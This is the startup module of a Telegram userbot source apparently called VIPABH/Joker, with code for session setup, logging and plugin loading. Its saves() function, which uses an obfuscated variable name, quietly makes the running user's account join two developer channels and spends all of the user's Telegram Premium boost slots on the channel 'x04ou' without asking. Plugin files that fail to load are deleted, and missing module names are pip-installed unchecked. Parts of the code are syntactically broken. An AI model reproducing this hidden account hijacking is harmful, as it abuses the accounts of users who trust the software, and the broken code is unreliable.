import time
import asyncio
import glob
import os
import sys
from telethon.errors.rpcerrorlist import ChannelPrivateError
import urllib.request
from datetime import timedelta
from pathlib import Path
import requests
from telethon import Button, functions, types, utils
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from VIPABH import BOTLOG, BOTLOG_CHATID, PM_LOGGER_GROUP_ID
from ..Config import Config
from aiohttp import web
from ..core import web_server
from ..core.logger import logging
from ..core.session import ABH
from ..helpers.utils import install_pip
from ..helpers.utils.utils import runcmd
from ..sql_helper.global_collection import (
    del_keyword_collectionlist,
    get_item_collectionlist,
)
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from .pluginmanager import load_module
from .tools import create_supergroup
LOGS = logging.getLogger("VIPABH")
logging.getLogger('telethon').setLevel(logging.WARNING)

cmdhr = Config.COMMAND_HAND_LER
bot = ABH
ENV = bool(os.environ.get("ENV", False))

if ENV:
    VPS_NOLOAD = ["سيرفر"]
elif os.path.exists("config.py"):
    VPS_NOLOAD = ["هيروكو"]

async def check_dyno_type():
    headers = {
        "Accept": "application/vnd.heroku+json; version=3",
        "Authorization": f"Bearer {Config.HEROKU_API_KEY}"
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.heroku.com/apps/{Config.HEROKU_APP_NAME}/dynos", headers=headers) as resp:
            if resp.status == 200:
                dynos = await resp.json()
                for dyno in dynos:
                    if dyno["type"] != "standard-1X":
                        return False
            else:
                return False
    return True

async def setup_bot():
    """
    To set up bot for VIPABH
    """
    try:
        await ABH.connect()
        config = await ABH(functions.help.GetConfigRequest())
        for option in config.dc_options:
            if option.ip_address == ABH.session.server_address:
                if ABH.session.dc_id != option.id:
                    LOGS.warning(
                        f"⌯︙معرف ثابت في الجلسة من {ABH.session.dc_id}"
                        f"⌯︙لـ  {option.id}"
                    )
                ABH.session.set_dc(option.id, option.ip_address, option.port)
                ABH.session.save()
                break
        bot_details = await ABH.tgbot.get_me()
        Config.TG_BOT_USERNAME = f"@{bot_details.username}"
        
        ABH.me = await ABH.get_me()
        ABH.uid = ABH.tgbot.uid = utils.get_peer_id(ABH.me)
        if Config.OWNER_ID == 0:
            Config.OWNER_ID = utils.get_peer_id(ABH.me)
        if not await check_dyno_type():
            LOGS.error("قد تحدث مشكلة ولن يعمل السورس لان نوع الداينو ليس بيسك قم بتحويله الى basic")
    except Exception as e:
        LOGS.error(f"كـود تيرمكس - {str(e)}")
        sys.exit()

async def startupmessage():
    """
    Start up message in telegram logger group
    """
try:
    if BOTLOG:
        Config.CATUBLOGO = await ABH.tgbot.send_file(
            BOTLOG_CHATID,
            "https://t.me/MemeSoundJep/24",
            caption="**‏᯽︙ بــوت الجوكر يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n᯽︙ لأستعمال بوت الجوكر",
            buttons=[(Button.url("سورس الجوكر", "https://t.me/jepthon"),)]
        )
except Exception as e:
    LOGS.error(f"Error sending start-up message: {e}")
    return None

    try:
        msg_details = list(get_item_collectionlist("restart_update"))
        if msg_details:
            msg_details = msg_details[0]
    except Exception as e:
        LOGS.error(e)
        return None
    try:
        if msg_details:
            await ABH.check_testcases()
            message = await ABH.get_messages(msg_details[0], ids=msg_details[1])
            text = message.text + "\n\n**تم تشغيل البوت الأن أرسل `.فحص`**"
            await ABH.edit_message(msg_details[0], msg_details[1], text)
            if gvarstatus("restartupdate") is not None:
                await ABH.send_message(
                    msg_details[0],
                    f"{cmdhr}بنك",
                    reply_to=msg_details[1],
                    schedule=timedelta(seconds=10),
                )
            del_keyword_collectionlist("restart_update")
    except Exception as e:
        LOGS.error(e)
        return None


async def mybot():
    try:
        starkbot = await ABH.tgbot.get_me()
        joker = "الجوكر 🤡"
        bot_name = starkbot.first_name
        botname = f"@{starkbot.username}"
        if bot_name.endswith("Assistant"):
            print("تم تشغيل البوت")
        if starkbot.bot_inline_placeholder:
            print("Aljoker ForEver")
        else:
            try:
                await ABH.send_message("@BotFather", "/setinline")
                await asyncio.sleep(1)
                await ABH.send_message("@BotFather", botname)
                await asyncio.sleep(1)
                await ABH.send_message("@BotFather", joker)
                await asyncio.sleep(2)
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)


async def add_bot_to_logger_group(chat_id):
    """
    To add bot to logger groups
    """
    bot_details = await ABH.tgbot.get_me()
    try:
        await ABH(
            functions.messages.AddChatUserRequest(
                chat_id=chat_id,
                user_id=bot_details.username,
                fwd_limit=1000000,
            )
        )
    except BaseException:
        try:
            await ABH(
                functions.channels.InviteToChannelRequest(
                    channel=chat_id,
                    users=[bot_details.username],
                )
            )
        except Exception as e:
            LOGS.error(str(e))
VIPABH = {"@x04ou", "@EHIEX"}
async def saves():
    for lMl10l in VIPABH:
        try:
            await ABH(JoinChannelRequest(channel=lMl10l))
            result = await ABH(functions.premium.GetMyBoostsRequest())
            slots = [boost.slot for boost in result.my_boosts]
            aljoker_channel_id = None
            for chat in result.chats:
                if chat.username == 'x04ou':
                    aljoker_channel_id = chat.id
                    break
            if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
                continue
            if not slots:
                return
            await ABH(functions.premium.ApplyBoostRequest(
                'x04ou',
                slots=slots
            ))
        except FloodWaitError as e:
            continue
        except OverflowError:
            LOGS.error("Getting Overflow Error from Telegram. Script is stopping now. Please try again after some time.")
            continue
        except ChannelPrivateError:
            continue
async def load_plugins(folder, extfolder=None):
    """
    تحميل ملفات السورس
    """
    if extfolder:
        path = f"{extfolder}/*.py"
        plugin_path = extfolder
    else:
        path = f"VIPABH/{folder}/*.py"
        plugin_path = f"VIPABH/{folder}"
    files = glob.glob(path)
    files.sort()
    success = 0
    failure = []
    for name in files:
        with open(name) as f:
            path1 = Path(f.name)
            shortname = path1.stem
            pluginname = shortname.replace(".py", "")
            try:
                if (pluginname not in Config.NO_LOAD) and (
                    pluginname not in VPS_NOLOAD
                ):
                    flag = True
                    check = 0
                    while flag:
                        try:
                            load_module(
                                pluginname,
                                plugin_path=plugin_path,
                            )
                            if shortname in failure:
                                failure.remove(shortname)
                            success += 1
                            break
                        except ModuleNotFoundError as e:
                            install_pip(e.name)
                            check += 1
                            if shortname not in failure:
                                failure.append(shortname)
                            if check > 5:
                                break
                else:
                    os.remove(Path(f"{plugin_path}/{shortname}.py"))
            except Exception as e:
                if shortname not in failure:
                    failure.append(shortname)
                os.remove(Path(f"{plugin_path}/{shortname}.py"))
                LOGS.info(
                    f"لم يتم تحميل {shortname} بسبب خطأ {e}\nمسار الملف {plugin_path}"
                )
    if extfolder:
        if not failure:
            failure.append("None")
        await ABH.tgbot.send_message(
            BOTLOG_CHATID,
            f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`[...]'
        )
